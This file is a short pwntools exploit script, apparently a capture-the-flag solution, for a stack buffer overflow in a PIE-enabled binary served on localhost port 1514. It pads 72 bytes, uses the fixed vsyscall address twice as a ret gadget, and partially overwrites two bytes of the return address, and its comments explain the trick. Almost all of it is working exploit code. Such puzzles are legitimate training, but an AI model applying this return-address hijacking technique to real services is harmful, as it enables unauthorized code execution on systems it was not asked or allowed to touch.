from pwn import *

r = remote("127.0.0.1","1514")

# http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso
# vsyscall = static address. act like "ret" gadget.
# since the program enabled PIE and no leak, we cannot use 'ret' gadget. so we use vsyscall instead
# our input fixed align to 90 since our offset to ret address just 72 we need 2*8 bytes as act just like 'ret'
# then we overflow 2 byte address. since 2 bytes not overflow the pie base, so pie is not our problem

payload = b'A'*72
payload += p64(0xffffffffff600800)*2 # mov rax, 'number'; syscall; ret
payload += b'\x8b\x10'

r.sendlineafter(b'password: ',b'100')
r.sendline(payload)
r.interactive()

# gdb  set follow-fork-mode child 
#